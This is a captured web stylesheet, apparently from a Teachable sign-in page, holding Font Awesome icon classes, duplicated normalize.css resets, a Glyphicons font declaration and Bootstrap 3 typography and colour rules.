.fa-database::before { content: ""; }

.fa-file-pdf-o::before { content: ""; }

.fa-file-word-o::before { content: ""; }

.fa-file-excel-o::before { content: ""; }

.fa-file-powerpoint-o::before { content: ""; }

.fa-file-photo-o::before, .fa-file-picture-o::before, .fa-file-image-o::before { content: ""; }

.fa-file-zip-o::before, .fa-file-archive-o::before { content: ""; }

.fa-file-sound-o::before, .fa-file-audio-o::before { content: ""; }

.fa-file-movie-o::before, .fa-file-video-o::before { content: ""; }

.fa-file-code-o::before { content: ""; }

.fa-vine::before { content: ""; }

.fa-codepen::before { content: ""; }

.fa-jsfiddle::before { content: ""; }

.fa-life-bouy::before, .fa-life-buoy::before, .fa-life-saver::before, .fa-support::before, .fa-life-ring::before { content: ""; }

.fa-circle-o-notch::before { content: ""; }

.fa-ra::before, .fa-resistance::before, .fa-rebel::before { content: ""; }

.fa-ge::before, .fa-empire::before { content: ""; }

.fa-git-square::before { content: ""; }

.fa-git::before { content: ""; }

.fa-y-combinator-square::before, .fa-yc-square::before, .fa-hacker-news::before { content: ""; }

.fa-tencent-weibo::before { content: ""; }

.fa-qq::before { content: ""; }

.fa-wechat::before, .fa-weixin::before { content: ""; }

.fa-send::before, .fa-paper-plane::before { content: ""; }

.fa-send-o::before, .fa-paper-plane-o::before { content: ""; }

.fa-history::before { content: ""; }

.fa-circle-thin::before { content: ""; }

.fa-header::before { content: ""; }

.fa-paragraph::before { content: ""; }

.fa-sliders::before { content: ""; }

.fa-share-alt::before { content: ""; }

.fa-share-alt-square::before { content: ""; }

.fa-bomb::before { content: ""; }

.fa-soccer-ball-o::before, .fa-futbol-o::before { content: ""; }

.fa-tty::before { content: ""; }

.fa-binoculars::before { content: ""; }

.fa-plug::before { content: ""; }

.fa-slideshare::before { content: ""; }

.fa-twitch::before { content: ""; }

.fa-yelp::before { content: ""; }

.fa-newspaper-o::before { content: ""; }

.fa-wifi::before { content: ""; }

.fa-calculator::before { content: ""; }

.fa-paypal::before { content: ""; }

.fa-google-wallet::before { content: ""; }

.fa-cc-visa::before { content: ""; }

.fa-cc-mastercard::before { content: ""; }

.fa-cc-discover::before { content: ""; }

.fa-cc-amex::before { content: ""; }

.fa-cc-paypal::before { content: ""; }

.fa-cc-stripe::before { content: ""; }

.fa-bell-slash::before { content: ""; }

.fa-bell-slash-o::before { content: ""; }

.fa-trash::before { content: ""; }

.fa-copyright::before { content: ""; }

.fa-at::before { content: ""; }

.fa-eyedropper::before { content: ""; }

.fa-paint-brush::before { content: ""; }

.fa-birthday-cake::before { content: ""; }

.fa-area-chart::before { content: ""; }

.fa-pie-chart::before { content: ""; }

.fa-line-chart::before { content: ""; }

.fa-lastfm::before { content: ""; }

.fa-lastfm-square::before { content: ""; }

.fa-toggle-off::before { content: ""; }

.fa-toggle-on::before { content: ""; }

.fa-bicycle::before { content: ""; }

.fa-bus::before { content: ""; }

.fa-ioxhost::before { content: ""; }

.fa-angellist::before { content: ""; }

.fa-cc::before { content: ""; }

.fa-shekel::before, .fa-sheqel::before, .fa-ils::before { content: ""; }

.fa-meanpath::before { content: ""; }

.fa-buysellads::before { content: ""; }

.fa-connectdevelop::before { content: ""; }

.fa-dashcube::before { content: ""; }

.fa-forumbee::before { content: ""; }

.fa-leanpub::before { content: ""; }

.fa-sellsy::before { content: ""; }

.fa-shirtsinbulk::before { content: ""; }

.fa-simplybuilt::before { content: ""; }

.fa-skyatlas::before { content: ""; }

.fa-cart-plus::before { content: ""; }

.fa-cart-arrow-down::before { content: ""; }

.fa-diamond::before { content: ""; }

.fa-ship::before { content: ""; }

.fa-user-secret::before { content: ""; }

.fa-motorcycle::before { content: ""; }

.fa-street-view::before { content: ""; }

.fa-heartbeat::before { content: ""; }

.fa-venus::before { content: ""; }

.fa-mars::before { content: ""; }

.fa-mercury::before { content: ""; }

.fa-intersex::before, .fa-transgender::before { content: ""; }

.fa-transgender-alt::before { content: ""; }

.fa-venus-double::before { content: ""; }

.fa-mars-double::before { content: ""; }

.fa-venus-mars::before { content: ""; }

.fa-mars-stroke::before { content: ""; }

.fa-mars-stroke-v::before { content: ""; }

.fa-mars-stroke-h::before { content: ""; }

.fa-neuter::before { content: ""; }

.fa-genderless::before { content: ""; }

.fa-facebook-official::before { content: ""; }

.fa-pinterest-p::before { content: ""; }

.fa-whatsapp::before { content: ""; }

.fa-server::before { content: ""; }

.fa-user-plus::before { content: ""; }

.fa-user-times::before { content: ""; }

.fa-hotel::before, .fa-bed::before { content: ""; }

.fa-viacoin::before { content: ""; }

.fa-train::before { content: ""; }

.fa-subway::before { content: ""; }

.fa-medium::before { content: ""; }

.fa-yc::before, .fa-y-combinator::before { content: ""; }

.fa-optin-monster::before { content: ""; }

.fa-opencart::before { content: ""; }

.fa-expeditedssl::before { content: ""; }

.fa-battery-4::before, .fa-battery::before, .fa-battery-full::before { content: ""; }

.fa-battery-3::before, .fa-battery-three-quarters::before { content: ""; }

.fa-battery-2::before, .fa-battery-half::before { content: ""; }

.fa-battery-1::before, .fa-battery-quarter::before { content: ""; }

.fa-battery-0::before, .fa-battery-empty::before { content: ""; }

.fa-mouse-pointer::before { content: ""; }

.fa-i-cursor::before { content: ""; }

.fa-object-group::before { content: ""; }

.fa-object-ungroup::before { content: ""; }

.fa-sticky-note::before { content: ""; }

.fa-sticky-note-o::before { content: ""; }

.fa-cc-jcb::before { content: ""; }

.fa-cc-diners-club::before { content: ""; }

.fa-clone::before { content: ""; }

.fa-balance-scale::before { content: ""; }

.fa-hourglass-o::before { content: ""; }

.fa-hourglass-1::before, .fa-hourglass-start::before { content: ""; }

.fa-hourglass-2::before, .fa-hourglass-half::before { content: ""; }

.fa-hourglass-3::before, .fa-hourglass-end::before { content: ""; }

.fa-hourglass::before { content: ""; }

.fa-hand-grab-o::before, .fa-hand-rock-o::before { content: ""; }

.fa-hand-stop-o::before, .fa-hand-paper-o::before { content: ""; }

.fa-hand-scissors-o::before { content: ""; }

.fa-hand-lizard-o::before { content: ""; }

.fa-hand-spock-o::before { content: ""; }

.fa-hand-pointer-o::before { content: ""; }

.fa-hand-peace-o::before { content: ""; }

.fa-trademark::before { content: ""; }

.fa-registered::before { content: ""; }

.fa-creative-commons::before { content: ""; }

.fa-gg::before { content: ""; }

.fa-gg-circle::before { content: ""; }

.fa-tripadvisor::before { content: ""; }

.fa-odnoklassniki::before { content: ""; }

.fa-odnoklassniki-square::before { content: ""; }

.fa-get-pocket::before { content: ""; }

.fa-wikipedia-w::before { content: ""; }

.fa-safari::before { content: ""; }

.fa-chrome::before { content: ""; }

.fa-firefox::before { content: ""; }

.fa-opera::before { content: ""; }

.fa-internet-explorer::before { content: ""; }

.fa-tv::before, .fa-television::before { content: ""; }

.fa-contao::before { content: ""; }

.fa-500px::before { content: ""; }

.fa-amazon::before { content: ""; }

.fa-calendar-plus-o::before { content: ""; }

.fa-calendar-minus-o::before { content: ""; }

.fa-calendar-times-o::before { content: ""; }

.fa-calendar-check-o::before { content: ""; }

.fa-industry::before { content: ""; }

.fa-map-pin::before { content: ""; }

.fa-map-signs::before { content: ""; }

.fa-map-o::before { content: ""; }

.fa-map::before { content: ""; }

.fa-commenting::before { content: ""; }

.fa-commenting-o::before { content: ""; }

.fa-houzz::before { content: ""; }

.fa-vimeo::before { content: ""; }

.fa-black-tie::before { content: ""; }

.fa-fonticons::before { content: ""; }

.fa-reddit-alien::before { content: ""; }

.fa-edge::before { content: ""; }

.fa-credit-card-alt::before { content: ""; }

.fa-codiepie::before { content: ""; }

.fa-modx::before { content: ""; }

.fa-fort-awesome::before { content: ""; }

.fa-usb::before { content: ""; }

.fa-product-hunt::before { content: ""; }

.fa-mixcloud::before { content: ""; }

.fa-scribd::before { content: ""; }

.fa-pause-circle::before { content: ""; }

.fa-pause-circle-o::before { content: ""; }

.fa-stop-circle::before { content: ""; }

.fa-stop-circle-o::before { content: ""; }

.fa-shopping-bag::before { content: ""; }

.fa-shopping-basket::before { content: ""; }

.fa-hashtag::before { content: ""; }

.fa-bluetooth::before { content: ""; }

.fa-bluetooth-b::before { content: ""; }

.fa-percent::before { content: ""; }

.fa-gitlab::before { content: ""; }

.fa-wpbeginner::before { content: ""; }

.fa-wpforms::before { content: ""; }

.fa-envira::before { content: ""; }

.fa-universal-access::before { content: ""; }

.fa-wheelchair-alt::before { content: ""; }

.fa-question-circle-o::before { content: ""; }

.fa-blind::before { content: ""; }

.fa-audio-description::before { content: ""; }

.fa-volume-control-phone::before { content: ""; }

.fa-braille::before { content: ""; }

.fa-assistive-listening-systems::before { content: ""; }

.fa-asl-interpreting::before, .fa-american-sign-language-interpreting::before { content: ""; }

.fa-deafness::before, .fa-hard-of-hearing::before, .fa-deaf::before { content: ""; }

.fa-glide::before { content: ""; }

.fa-glide-g::before { content: ""; }

.fa-signing::before, .fa-sign-language::before { content: ""; }

.fa-low-vision::before { content: ""; }

.fa-viadeo::before { content: ""; }

.fa-viadeo-square::before { content: ""; }

.fa-snapchat::before { content: ""; }

.fa-snapchat-ghost::before { content: ""; }

.fa-snapchat-square::before { content: ""; }

.fa-pied-piper::before { content: ""; }

.fa-first-order::before { content: ""; }

.fa-yoast::before { content: ""; }

.fa-themeisle::before { content: ""; }

.fa-google-plus-circle::before, .fa-google-plus-official::before { content: ""; }

.fa-fa::before, .fa-font-awesome::before { content: ""; }

.fa-handshake-o::before { content: ""; }

.fa-envelope-open::before { content: ""; }

.fa-envelope-open-o::before { content: ""; }

.fa-linode::before { content: ""; }

.fa-address-book::before { content: ""; }

.fa-address-book-o::before { content: ""; }

.fa-vcard::before, .fa-address-card::before { content: ""; }

.fa-vcard-o::before, .fa-address-card-o::before { content: ""; }

.fa-user-circle::before { content: ""; }

.fa-user-circle-o::before { content: ""; }

.fa-user-o::before { content: ""; }

.fa-id-badge::before { content: ""; }

.fa-drivers-license::before, .fa-id-card::before { content: ""; }

.fa-drivers-license-o::before, .fa-id-card-o::before { content: ""; }

.fa-quora::before { content: ""; }

.fa-free-code-camp::before { content: ""; }

.fa-telegram::before { content: ""; }

.fa-thermometer-4::before, .fa-thermometer::before, .fa-thermometer-full::before { content: ""; }

.fa-thermometer-3::before, .fa-thermometer-three-quarters::before { content: ""; }

.fa-thermometer-2::before, .fa-thermometer-half::before { content: ""; }

.fa-thermometer-1::before, .fa-thermometer-quarter::before { content: ""; }

.fa-thermometer-0::before, .fa-thermometer-empty::before { content: ""; }

.fa-shower::before { content: ""; }

.fa-bathtub::before, .fa-s15::before, .fa-bath::before { content: ""; }

.fa-podcast::before { content: ""; }

.fa-window-maximize::before { content: ""; }

.fa-window-minimize::before { content: ""; }

.fa-window-restore::before { content: ""; }

.fa-times-rectangle::before, .fa-window-close::before { content: ""; }

.fa-times-rectangle-o::before, .fa-window-close-o::before { content: ""; }

.fa-bandcamp::before { content: ""; }

.fa-grav::before { content: ""; }

.fa-etsy::before { content: ""; }

.fa-imdb::before { content: ""; }

.fa-ravelry::before { content: ""; }

.fa-eercast::before { content: ""; }

.fa-microchip::before { content: ""; }

.fa-snowflake-o::before { content: ""; }

.fa-superpowers::before { content: ""; }

.fa-wpexplorer::before { content: ""; }

.fa-meetup::before { content: ""; }

.sr-only { position: absolute; width: 1px; height: 1px; padding: 0px; margin: -1px; overflow: hidden; clip: rect(0px, 0px, 0px, 0px); border: 0px; }

.sr-only-focusable:active, .sr-only-focusable:focus { position: static; width: auto; height: auto; margin: 0px; overflow: visible; clip: auto; }


html { font-family: sans-serif; text-size-adjust: 100%; }

body { margin: 0px; }

article, aside, details, figcaption, figure, footer, header, hgroup, main, menu, nav, section, summary { display: block; }

audio, canvas, progress, video { display: inline-block; vertical-align: baseline; }

audio:not([controls]) { display: none; height: 0px; }

[hidden], template { display: none; }

a { background-color: transparent; }

a:active, a:hover { outline: 0px; }

abbr[title] { border-bottom: 1px dotted; }

b, strong { font-weight: bold; }

dfn { font-style: italic; }

h1 { font-size: 2em; margin: 0.67em 0px; }

mark { background: rgb(255, 255, 0); color: rgb(0, 0, 0); }

small { font-size: 80%; }

sub, sup { font-size: 75%; line-height: 0; position: relative; vertical-align: baseline; }

sup { top: -0.5em; }

sub { bottom: -0.25em; }

img { border: 0px; }

svg:not(:root) { overflow: hidden; }

figure { margin: 1em 40px; }

hr { box-sizing: content-box; height: 0px; }

pre { overflow: auto; }

code, kbd, pre, samp { font-family: monospace, monospace; font-size: 1em; }

button, input, optgroup, select, textarea { color: inherit; font: inherit; margin: 0px; }

button { overflow: visible; }

button, select { text-transform: none; }

button, html input[type="button"], input[type="reset"], input[type="submit"] { appearance: button; cursor: pointer; }

button[disabled], html input[disabled] { cursor: default; }

input { line-height: normal; }

input[type="checkbox"], input[type="radio"] { box-sizing: border-box; padding: 0px; }

input[type="number"]::-webkit-inner-spin-button, input[type="number"]::-webkit-outer-spin-button { height: auto; }

input[type="search"] { appearance: textfield; box-sizing: content-box; }

input[type="search"]::-webkit-search-cancel-button, input[type="search"]::-webkit-search-decoration { appearance: none; }

fieldset { border: 1px solid rgb(192, 192, 192); margin: 0px 2px; padding: 0.35em 0.625em 0.75em; }

legend { border: 0px; padding: 0px; }

textarea { overflow: auto; }

optgroup { font-weight: bold; }

table { border-collapse: collapse; border-spacing: 0px; }

td, th { padding: 0px; }

html { font-family: sans-serif; text-size-adjust: 100%; }

body { margin: 0px; }

article, aside, details, figcaption, figure, footer, header, hgroup, main, nav, section, summary { display: block; }

audio, canvas, progress, video { display: inline-block; vertical-align: baseline; }

audio:not([controls]) { display: none; height: 0px; }

[hidden], template { display: none; }

a { background: 0px 0px; }

a:active, a:hover { outline: 0px; }

abbr[title] { border-bottom: 1px dotted; }

b, strong { font-weight: 700; }

dfn { font-style: italic; }

h1 { margin: 0.67em 0px; font-size: 2em; }

mark { color: rgb(0, 0, 0); background: rgb(255, 255, 0); }

small { font-size: 80%; }

sub, sup { position: relative; font-size: 75%; line-height: 0; vertical-align: baseline; }

sup { top: -0.5em; }

sub { bottom: -0.25em; }

img { border: 0px; }

svg:not(:root) { overflow: hidden; }

figure { margin: 1em 40px; }

hr { height: 0px; box-sizing: content-box; }

pre { overflow: auto; }

code, kbd, pre, samp { font-family: monospace, monospace; font-size: 1em; }

button, input, optgroup, select, textarea { margin: 0px; font: inherit; color: inherit; }

button { overflow: visible; }

button, select { text-transform: none; }

button, html input[type="button"], input[type="reset"], input[type="submit"] { appearance: button; cursor: pointer; }

button[disabled], html input[disabled] { cursor: default; }

input { line-height: normal; }

input[type="checkbox"], input[type="radio"] { box-sizing: border-box; padding: 0px; }

input[type="number"]::-webkit-inner-spin-button, input[type="number"]::-webkit-outer-spin-button { height: auto; }

input[type="search"] { box-sizing: content-box; appearance: textfield; }

input[type="search"]::-webkit-search-cancel-button, input[type="search"]::-webkit-search-decoration { appearance: none; }

fieldset { padding: 0.35em 0.625em 0.75em; margin: 0px 2px; border: 1px solid silver; }

legend { padding: 0px; border: 0px; }

textarea { overflow: auto; }

optgroup { font-weight: 700; }

table { border-spacing: 0px; border-collapse: collapse; }

td, th { padding: 0px; }

@media print {
  * { color: rgb(0, 0, 0) !important; text-shadow: none !important; background: transparent !important; box-shadow: none !important; }
  a, a:visited { text-decoration: underline; }
  a[href]::after { content: " (" attr(href) ")"; }
  abbr[title]::after { content: " (" attr(title) ")"; }
  a[href^="javascript:"]::after, a[href^="#"]::after { content: ""; }
  pre, blockquote { border: 1px solid rgb(153, 153, 153); break-inside: avoid; }
  thead { display: table-header-group; }
  tr, img { break-inside: avoid; }
  img { max-width: 100% !important; }
  p, h2, h3 { orphans: 3; widows: 3; }
  h2, h3 { break-after: avoid; }
  select { background: rgb(255, 255, 255) !important; }
  .navbar { display: none; }
  .table td, .table th { background-color: rgb(255, 255, 255) !important; }
  .btn > .caret, .dropup > .btn > .caret { border-top-color: rgb(0, 0, 0) !important; }
  .label { border: 1px solid rgb(0, 0, 0); }
  .table { border-collapse: collapse !important; }
  .table-bordered th, .table-bordered td { border: 1px solid rgb(221, 221, 221) !important; }
}

@font-face { font-family: "Glyphicons Halflings"; src: url("https://sso.teachable.com/secure/teachable_accounts/sign_in//assets.teachablecdn.com/fonts/bootstrap/glyphicons-halflings-regular.eot?#iefix") format("embedded-opentype"), url("https://sso.teachable.com/secure/teachable_accounts/sign_in//assets.teachablecdn.com/fonts/bootstrap/glyphicons-halflings-regular.woff") format("woff"), url("https://sso.teachable.com/secure/teachable_accounts/sign_in//assets.teachablecdn.com/fonts/bootstrap/glyphicons-halflings-regular.ttf") format("truetype"), url("https://sso.teachable.com/secure/teachable_accounts/sign_in//assets.teachablecdn.com/fonts/bootstrap/glyphicons-halflings-regular.svg#glyphicons_halflingsregular") format("svg"); }

.glyphicon { position: relative; top: 1px; display: inline-block; font-family: "Glyphicons Halflings"; font-style: normal; font-weight: 400; line-height: 1; -webkit-font-smoothing: antialiased; }

.glyphicon-asterisk::before { content: "*"; }

.glyphicon-plus::before { content: "+"; }

.glyphicon-euro::before { content: "€"; }

.glyphicon-minus::before { content: "−"; }

.glyphicon-cloud::before { content: "☁"; }

.glyphicon-envelope::before { content: "✉"; }

.glyphicon-pencil::before { content: "✏"; }

.glyphicon-glass::before { content: ""; }

.glyphicon-music::before { content: ""; }

.glyphicon-search::before { content: ""; }

.glyphicon-heart::before { content: ""; }

.glyphicon-star::before { content: ""; }

.glyphicon-star-empty::before { content: ""; }

.glyphicon-user::before { content: ""; }

.glyphicon-film::before { content: ""; }

.glyphicon-th-large::before { content: ""; }

.glyphicon-th::before { content: ""; }

.glyphicon-th-list::before { content: ""; }

.glyphicon-ok::before { content: ""; }

.glyphicon-remove::before { content: ""; }

.glyphicon-zoom-in::before { content: ""; }

.glyphicon-zoom-out::before { content: ""; }

.glyphicon-off::before { content: ""; }

.glyphicon-signal::before { content: ""; }

.glyphicon-cog::before { content: ""; }

.glyphicon-trash::before { content: ""; }

.glyphicon-home::before { content: ""; }

.glyphicon-file::before { content: ""; }

.glyphicon-time::before { content: ""; }

.glyphicon-road::before { content: ""; }

.glyphicon-download-alt::before { content: ""; }

.glyphicon-download::before { content: ""; }

.glyphicon-upload::before { content: ""; }

.glyphicon-inbox::before { content: ""; }

.glyphicon-play-circle::before { content: ""; }

.glyphicon-repeat::before { content: ""; }

.glyphicon-refresh::before { content: ""; }

.glyphicon-list-alt::before { content: ""; }

.glyphicon-lock::before { content: ""; }

.glyphicon-flag::before { content: ""; }

.glyphicon-headphones::before { content: ""; }

.glyphicon-volume-off::before { content: ""; }

.glyphicon-volume-down::before { content: ""; }

.glyphicon-volume-up::before { content: ""; }

.glyphicon-qrcode::before { content: ""; }

.glyphicon-barcode::before { content: ""; }

.glyphicon-tag::before { content: ""; }

.glyphicon-tags::before { content: ""; }

.glyphicon-book::before { content: ""; }

.glyphicon-bookmark::before { content: ""; }

.glyphicon-print::before { content: ""; }

.glyphicon-camera::before { content: ""; }

.glyphicon-font::before { content: ""; }

.glyphicon-bold::before { content: ""; }

.glyphicon-italic::before { content: ""; }

.glyphicon-text-height::before { content: ""; }

.glyphicon-text-width::before { content: ""; }

.glyphicon-align-left::before { content: ""; }

.glyphicon-align-center::before { content: ""; }

.glyphicon-align-right::before { content: ""; }

.glyphicon-align-justify::before { content: ""; }

.glyphicon-list::before { content: ""; }

.glyphicon-indent-left::before { content: ""; }

.glyphicon-indent-right::before { content: ""; }

.glyphicon-facetime-video::before { content: ""; }

.glyphicon-picture::before { content: ""; }

.glyphicon-map-marker::before { content: ""; }

.glyphicon-adjust::before { content: ""; }

.glyphicon-tint::before { content: ""; }

.glyphicon-edit::before { content: ""; }

.glyphicon-share::before { content: ""; }

.glyphicon-check::before { content: ""; }

.glyphicon-move::before { content: ""; }

.glyphicon-step-backward::before { content: ""; }

.glyphicon-fast-backward::before { content: ""; }

.glyphicon-backward::before { content: ""; }

.glyphicon-play::before { content: ""; }

.glyphicon-pause::before { content: ""; }

.glyphicon-stop::before { content: ""; }

.glyphicon-forward::before { content: ""; }

.glyphicon-fast-forward::before { content: ""; }

.glyphicon-step-forward::before { content: ""; }

.glyphicon-eject::before { content: ""; }

.glyphicon-chevron-left::before { content: ""; }

.glyphicon-chevron-right::before { content: ""; }

.glyphicon-plus-sign::before { content: ""; }

.glyphicon-minus-sign::before { content: ""; }

.glyphicon-remove-sign::before { content: ""; }

.glyphicon-ok-sign::before { content: ""; }

.glyphicon-question-sign::before { content: ""; }

.glyphicon-info-sign::before { content: ""; }

.glyphicon-screenshot::before { content: ""; }

.glyphicon-remove-circle::before { content: ""; }

.glyphicon-ok-circle::before { content: ""; }

.glyphicon-ban-circle::before { content: ""; }

.glyphicon-arrow-left::before { content: ""; }

.glyphicon-arrow-right::before { content: ""; }

.glyphicon-arrow-up::before { content: ""; }

.glyphicon-arrow-down::before { content: ""; }

.glyphicon-share-alt::before { content: ""; }

.glyphicon-resize-full::before { content: ""; }

.glyphicon-resize-small::before { content: ""; }

.glyphicon-exclamation-sign::before { content: ""; }

.glyphicon-gift::before { content: ""; }

.glyphicon-leaf::before { content: ""; }

.glyphicon-fire::before { content: ""; }

.glyphicon-eye-open::before { content: ""; }

.glyphicon-eye-close::before { content: ""; }

.glyphicon-warning-sign::before { content: ""; }

.glyphicon-plane::before { content: ""; }

.glyphicon-calendar::before { content: ""; }

.glyphicon-random::before { content: ""; }

.glyphicon-comment::before { content: ""; }

.glyphicon-magnet::before { content: ""; }

.glyphicon-chevron-up::before { content: ""; }

.glyphicon-chevron-down::before { content: ""; }

.glyphicon-retweet::before { content: ""; }

.glyphicon-shopping-cart::before { content: ""; }

.glyphicon-folder-close::before { content: ""; }

.glyphicon-folder-open::before { content: ""; }

.glyphicon-resize-vertical::before { content: ""; }

.glyphicon-resize-horizontal::before { content: ""; }

.glyphicon-hdd::before { content: ""; }

.glyphicon-bullhorn::before { content: ""; }

.glyphicon-bell::before { content: ""; }

.glyphicon-certificate::before { content: ""; }

.glyphicon-thumbs-up::before { content: ""; }

.glyphicon-thumbs-down::before { content: ""; }

.glyphicon-hand-right::before { content: ""; }

.glyphicon-hand-left::before { content: ""; }

.glyphicon-hand-up::before { content: ""; }

.glyphicon-hand-down::before { content: ""; }

.glyphicon-circle-arrow-right::before { content: ""; }

.glyphicon-circle-arrow-left::before { content: ""; }

.glyphicon-circle-arrow-up::before { content: ""; }

.glyphicon-circle-arrow-down::before { content: ""; }

.glyphicon-globe::before { content: ""; }

.glyphicon-wrench::before { content: ""; }

.glyphicon-tasks::before { content: ""; }

.glyphicon-filter::before { content: ""; }

.glyphicon-briefcase::before { content: ""; }

.glyphicon-fullscreen::before { content: ""; }

.glyphicon-dashboard::before { content: ""; }

.glyphicon-paperclip::before { content: ""; }

.glyphicon-heart-empty::before { content: ""; }

.glyphicon-link::before { content: ""; }

.glyphicon-phone::before { content: ""; }

.glyphicon-pushpin::before { content: ""; }

.glyphicon-usd::before { content: ""; }

.glyphicon-gbp::before { content: ""; }

.glyphicon-sort::before { content: ""; }

.glyphicon-sort-by-alphabet::before { content: ""; }

.glyphicon-sort-by-alphabet-alt::before { content: ""; }

.glyphicon-sort-by-order::before { content: ""; }

.glyphicon-sort-by-order-alt::before { content: ""; }

.glyphicon-sort-by-attributes::before { content: ""; }

.glyphicon-sort-by-attributes-alt::before { content: ""; }

.glyphicon-unchecked::before { content: ""; }

.glyphicon-expand::before { content: ""; }

.glyphicon-collapse-down::before { content: ""; }

.glyphicon-collapse-up::before { content: ""; }

.glyphicon-log-in::before { content: ""; }

.glyphicon-flash::before { content: ""; }

.glyphicon-log-out::before { content: ""; }

.glyphicon-new-window::before { content: ""; }

.glyphicon-record::before { content: ""; }

.glyphicon-save::before { content: ""; }

.glyphicon-open::before { content: ""; }

.glyphicon-saved::before { content: ""; }

.glyphicon-import::before { content: ""; }

.glyphicon-export::before { content: ""; }

.glyphicon-send::before { content: ""; }

.glyphicon-floppy-disk::before { content: ""; }

.glyphicon-floppy-saved::before { content: ""; }

.glyphicon-floppy-remove::before { content: ""; }

.glyphicon-floppy-save::before { content: ""; }

.glyphicon-floppy-open::before { content: ""; }

.glyphicon-credit-card::before { content: ""; }

.glyphicon-transfer::before { content: ""; }

.glyphicon-cutlery::before { content: ""; }

.glyphicon-header::before { content: ""; }

.glyphicon-compressed::before { content: ""; }

.glyphicon-earphone::before { content: ""; }

.glyphicon-phone-alt::before { content: ""; }

.glyphicon-tower::before { content: ""; }

.glyphicon-stats::before { content: ""; }

.glyphicon-sd-video::before { content: ""; }

.glyphicon-hd-video::before { content: ""; }

.glyphicon-subtitles::before { content: ""; }

.glyphicon-sound-stereo::before { content: ""; }

.glyphicon-sound-dolby::before { content: ""; }

.glyphicon-sound-5-1::before { content: ""; }

.glyphicon-sound-6-1::before { content: ""; }

.glyphicon-sound-7-1::before { content: ""; }

.glyphicon-copyright-mark::before { content: ""; }

.glyphicon-registration-mark::before { content: ""; }

.glyphicon-cloud-download::before { content: ""; }

.glyphicon-cloud-upload::before { content: ""; }

.glyphicon-tree-conifer::before { content: ""; }

.glyphicon-tree-deciduous::before { content: ""; }

* { box-sizing: border-box; }

::before, ::after { box-sizing: border-box; }

html { font-size: 10px; -webkit-tap-highlight-color: rgba(0, 0, 0, 0); }

body { font-family: "Helvetica Neue", Helvetica, Arial, sans-serif; font-size: 14px; line-height: 1.42857; color: rgb(51, 51, 51); background-color: rgb(255, 255, 255); }

input, button, select, textarea { font-family: inherit; font-size: inherit; line-height: inherit; }

a { color: rgb(66, 139, 202); text-decoration: none; }

a:hover, a:focus { color: rgb(42, 100, 150); text-decoration: underline; }

a:focus { outline: -webkit-focus-ring-color auto 5px; outline-offset: -2px; }

figure { margin: 0px; }

img { vertical-align: middle; }

.img-responsive, .thumbnail > img, .thumbnail a > img, .carousel-inner > .item > img, .carousel-inner > .item > a > img { display: block; max-width: 100%; height: auto; }

.img-rounded { border-radius: 6px; }

.img-thumbnail { display: inline-block; max-width: 100%; height: auto; padding: 4px; line-height: 1.42857; background-color: rgb(255, 255, 255); border: 1px solid rgb(221, 221, 221); border-radius: 4px; transition: all 0.2s ease-in-out 0s; }

.img-circle { border-radius: 50%; }

hr { margin-top: 20px; margin-bottom: 20px; border-width: 1px 0px 0px; border-right-style: initial; border-bottom-style: initial; border-left-style: initial; border-right-color: initial; border-bottom-color: initial; border-left-color: initial; border-image: initial; border-top-style: solid; border-top-color: rgb(238, 238, 238); }

.sr-only { position: absolute; width: 1px; height: 1px; padding: 0px; margin: -1px; overflow: hidden; clip: rect(0px, 0px, 0px, 0px); border: 0px; }

.sr-only-focusable:active, .sr-only-focusable:focus { position: static; width: auto; height: auto; margin: 0px; overflow: visible; clip: auto; }

h1, h2, h3, h4, h5, h6, .h1, .h2, .h3, .h4, .h5, .h6 { font-family: inherit; font-weight: 500; line-height: 1.1; color: inherit; }

h1 small, h2 small, h3 small, h4 small, h5 small, h6 small, .h1 small, .h2 small, .h3 small, .h4 small, .h5 small, .h6 small, h1 .small, h2 .small, h3 .small, h4 .small, h5 .small, h6 .small, .h1 .small, .h2 .small, .h3 .small, .h4 .small, .h5 .small, .h6 .small { font-weight: 400; line-height: 1; color: rgb(119, 119, 119); }

h1, .h1, h2, .h2, h3, .h3 { margin-top: 20px; margin-bottom: 10px; }

h1 small, .h1 small, h2 small, .h2 small, h3 small, .h3 small, h1 .small, .h1 .small, h2 .small, .h2 .small, h3 .small, .h3 .small { font-size: 65%; }

h4, .h4, h5, .h5, h6, .h6 { margin-top: 10px; margin-bottom: 10px; }

h4 small, .h4 small, h5 small, .h5 small, h6 small, .h6 small, h4 .small, .h4 .small, h5 .small, .h5 .small, h6 .small, .h6 .small { font-size: 75%; }

h1, .h1 { font-size: 36px; }

h2, .h2 { font-size: 30px; }

h3, .h3 { font-size: 24px; }

h4, .h4 { font-size: 18px; }

h5, .h5 { font-size: 14px; }

h6, .h6 { font-size: 12px; }

p { margin: 0px 0px 10px; }

.lead { margin-bottom: 20px; font-size: 16px; font-weight: 300; line-height: 1.4; }

@media (min-width: 768px) {
  .lead { font-size: 21px; }
}

small, .small { font-size: 85%; }

cite { font-style: normal; }

mark, .mark { padding: 0.2em; background-color: rgb(252, 248, 227); }

.text-left { text-align: left; }

.text-right { text-align: right; }

.text-center { text-align: center; }

.text-justify { text-align: justify; }

.text-nowrap { white-space: nowrap; }

.text-lowercase { text-transform: lowercase; }

.text-uppercase { text-transform: uppercase; }

.text-capitalize { text-transform: capitalize; }

.text-muted { color: rgb(119, 119, 119); }

.text-primary { color: rgb(66, 139, 202); }

a.text-primary:hover { color: rgb(48, 113, 169); }

.text-success { color: rgb(60, 118, 61); }

a.text-success:hover { color: rgb(43, 84, 44); }

.text-info { color: rgb(49, 112, 143); }

a.text-info:hover { color: rgb(36, 82, 105); }

.text-warning { color: rgb(138, 109, 59); }

a.text-warning:hover { color: rgb(102, 81, 44); }

.text-danger { color: rgb(169, 68, 66); }

a.text-danger:hover { color: rgb(132, 53, 52); }

.bg-primary { color: rgb(255, 255, 255); background-color: rgb(66, 139, 202); }

a.bg-primary:hover { background-color: rgb(48, 113, 169); }

.bg-success { background-color: rgb(223, 240, 216); }

a.bg-success:hover { background-color: rgb(193, 226, 179); }

.bg-info { background-color: rgb(217, 237, 247); }

a.bg-info:hover { background-color: rgb(175, 217, 238); }

.bg-warning { background-color: rgb(252, 248, 227); }

a.bg-warning:hover { background-color: rgb(247, 236, 181); }

.bg-danger { background-color: rgb(242, 222, 222); }

a.bg-danger:hover { background-color: rgb(228, 185, 185); }

.page-header { padding-bottom: 9px; margin: 40px 0px 20px; border-bottom: 1px solid rgb(238, 238, 238); }

ul, ol { margin-top: 0px; margin-bottom: 10px; }

ul ul, ol ul, ul ol, ol ol { margin-bottom: 0px; }

.list-unstyled { padding-left: 0px; list-style: none; }

